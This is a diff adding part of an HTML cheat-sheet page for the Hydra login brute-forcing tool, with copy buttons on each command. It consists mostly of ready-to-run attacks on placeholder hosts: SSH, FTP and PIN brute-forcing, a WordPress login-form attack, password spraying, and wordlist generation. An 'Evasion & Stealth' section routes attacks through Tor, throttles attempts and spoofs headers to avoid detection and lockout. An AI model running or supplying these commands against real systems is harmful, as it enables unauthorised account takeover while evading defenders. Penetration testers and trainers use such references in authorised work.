+        <div class="prompt-line"><span class="ps1">$</span><span class="pc"><span class="val">/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt</span></span></div>
+        <div class="prompt-line"><span class="ps1">$</span><span class="pc"><span class="val">/usr/share/seclists/Usernames/top-usernames-shortlist.txt</span></span></div>
+        <div class="prompt-line"><span class="ps1">$</span><span class="pc"><span class="val">/usr/share/metasploit-framework/data/wordlists/</span></span></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot cyan"></span>Quick Wordlist Generation</div>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Brute-force 4-digit PINs (0000-9999)</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-x</span> <span class="val">4:4:1</span> <span class="host">10.0.0.1</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># 6-8 char lowercase alphanum brute</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-x</span> <span class="val">6:8:a1</span> <span class="host">10.0.0.1</span> <span class="svc">ftp</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Use CeWL to scrape site for custom wordlist</span><br>cewl <span class="flag">-d</span> <span class="val">2</span> <span class="flag">-m</span> <span class="val">5</span> <span class="val">http://target.com</span> <span class="flag">-w</span> <span class="val">cewl_words.txt</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Use crunch to generate custom list</span><br>crunch <span class="val">6</span> <span class="val">8</span> <span class="val">abc123</span> <span class="flag">-o</span> <span class="val">custom.txt</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Gunzip rockyou if compressed</span><br>gunzip <span class="val">/usr/share/wordlists/rockyou.txt.gz</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot yellow"></span>Combo File Format (-C flag)</div>
+      <div class="cmd-list">
+        <div class="prompt-line"><span class="ps1">#</span><span class="pc"> Format: login:password (one pair per line)</span></div>
+        <div class="prompt-line"><span class="ps1">$</span><span class="pc"><span class="val">cat</span> combos.txt</span></div>
+        <div class="prompt-line"><span class="ps1"></span><span class="pc" style="color:var(--green)">admin:password<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root:toor<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user:1234<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin:admin123</span></div>
+        <div class="cmd-item">
+          <div class="cmd">hydra <span class="flag">-C</span> <span class="val">combos.txt</span> <span class="host">10.0.0.1</span> <span class="svc">ftp</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="tip-box tip-green" style="margin:0 0 1rem;">
+      <strong>-e nsr explained:</strong> n = try empty password | s = try username as password | r = try reversed username as password. Always include this for quick wins!
+    </div>
+    <div class="tip-box tip-red" style="margin:0 0 1rem;">
+      <strong>SSH thread limit:</strong> Keep <code>-t 4</code> for SSH. Higher thread counts trigger MaxStartups in sshd_config and lock you out. Use <code>-W 1</code> to add a 1-second delay between attempts to avoid detection.
+    </div>
+  </div>
+
+  <!-- ADVANCED & EVASION -->
+  <div id="tab-advanced" class="panel">
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot purple"></span>Session Management</div>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Restore interrupted session (hydra.restore auto-created)</span><br>hydra <span class="flag">-R</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Ignore existing restore file and start fresh</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-I</span> <span class="host">10.0.0.1</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Save found credentials to output file</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-o</span> <span class="val">found_creds.txt</span> <span class="host">10.0.0.1</span> <span class="svc">ftp</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># JSON output format</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-o</span> <span class="val">out.json</span> <span class="flag">-b</span> <span class="val">json</span> <span class="host">10.0.0.1</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot red"></span>Evasion & Stealth</div>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Slow attack — 1 connection/thread every 5 seconds</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-t</span> <span class="val">1</span> <span class="flag">-W</span> <span class="val">5</span> <span class="host">10.0.0.1</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Route through SOCKS5 proxy (Tor or Proxychains)</span><br>proxychains hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.1</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Loop users first (spray one password across all users)</span><br>hydra <span class="flag">-L</span> <span class="val">users.txt</span> <span class="flag">-p</span> <span class="val">Summer2024!</span> <span class="flag">-u</span> <span class="host">10.0.0.1</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Set custom timeout (longer = less aggressive)</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-w</span> <span class="val">60</span> <span class="flag">-t</span> <span class="val">2</span> <span class="host">10.0.0.1</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot cyan"></span>HTTP Form — Advanced Techniques</div>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Inject custom headers (User-Agent spoof)</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">target.com</span> <span class="svc">http-post-form</span> <span class="val">"/login:user=^USER^&pass=^PASS^:fail:H=User-Agent\: Mozilla/5.0"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Multi-header injection (Cookie + Referer)</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.1</span> <span class="svc">http-post-form</span> <span class="val">"/login:u=^USER^&p=^PASS^:Invalid:H=Cookie\: token=abc:H=Referer\: http://10.0.0.1/login"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># WordPress login attack</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">rockyou.txt</span> <span class="host">target.com</span> <span class="svc">http-post-form</span> <span class="val">"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login&redirect_to=/wp-admin/&testcookie=1:is incorrect:H=Cookie\: wordpress_test_cookie=WP+Cookie+check"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot yellow"></span>Hydra GTK (GUI Mode)</div>
+      <div class="cmd-list">
+        <div class="prompt-line"><span class="ps1">$</span><span class="pc">xhydra</span></div>
+        <div class="prompt-line"><span class="ps1">#</span><span class="pc" style="color:var(--text-muted);"> Launches the graphical frontend — same features as CLI</span></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot green"></span>Debug & Troubleshooting</div>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Show module-specific help</span><br>hydra <span class="flag">-U</span> <span class="svc">http-post-form</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Full debug output for HTTP form</span><br>hydra <span class="flag">-l</span> <span class="val">test</span> <span class="flag">-p</span> <span class="val">test</span> <span class="flag">-d</span> <span class="host">10.0.0.1</span> <span class="svc">http-post-form</span> <span class="val">"/login:u=^USER^&p=^PASS^:fail"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Get Hydra version and supported services</span><br>hydra <span class="flag">-h</span> <span class="val">2>&1</span> | grep <span class="val">"Supported services"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid2">
+      <div class="tip-box tip-green" style="margin:0 0 1rem;">
+        <strong>Password Spray:</strong> Use <code>-u</code> with a single password (<code>-p</code>) across many users (<code>-L</code>). Avoids account lockout by trying one pass per user before moving to the next.
+      </div>
+      <div class="tip-box tip-cyan" style="margin:0 0 1rem;">
+        <strong>Restore session:</strong> Hydra auto-creates <code>hydra.restore</code> on interrupt (Ctrl+C). Always run <code>hydra -R</code> to resume without losing progress.
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot red"></span>Common Errors & Fixes</div>
+      <table class="flag-table">
+        <thead><tr><th>Error</th><th>Cause</th><th>Fix</th></tr></thead>
+        <tbody>
+          <tr><td class="fl" style="color:var(--red);">[ERROR] Child with pid ... was killed</td><td class="fd">Too many threads, target blacklisting</td><td class="fv">Reduce -t, add -W delay</td></tr>
+          <tr><td class="fl" style="color:var(--red);">[ERROR] could not connect to target</td><td class="fd">Port closed or firewall</td><td class="fv">Verify port with nmap first</td></tr>
+          <tr><td class="fl" style="color:var(--red);">0 valid passwords found</td><td class="fd">Wrong fail string in form</td><td class="fv">Use -d to inspect HTTP response, fix fail string</td></tr>
+          <tr><td class="fl" style="color:var(--red);">LDAP: Invalid credentials</td><td class="fd">Wrong bind format</td><td class="fv">Try ldap3 or ldap2; check -m flag</td></tr>
+          <tr><td class="fl" style="color:var(--red);">ssh_exchange_identification</td><td class="fd">MaxStartups hit on SSH</td><td class="fv">Use -t 2 -W 3 for SSH</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<script>
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelector('[onclick="switchTab(\''+name+'\')"]').classList.add('active');
+  document.getElementById('tab-'+name).classList.add('active');
+}
+
+function copyCmd(btn) {
+  const cmd = btn.previousElementSibling.innerText.replace(/^#.*\n/,'').trim();
+  navigator.clipboard.writeText(cmd).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = 'copied!';
+    btn.style.color = 'var(--green)';
+    btn.style.borderColor = 'var(--green)';
+    setTimeout(() => {
+      btn.textContent = orig;
+      btn.style.color = '';
+      btn.style.borderColor = '';
+    }, 1400);
+  });
+}
+</script>
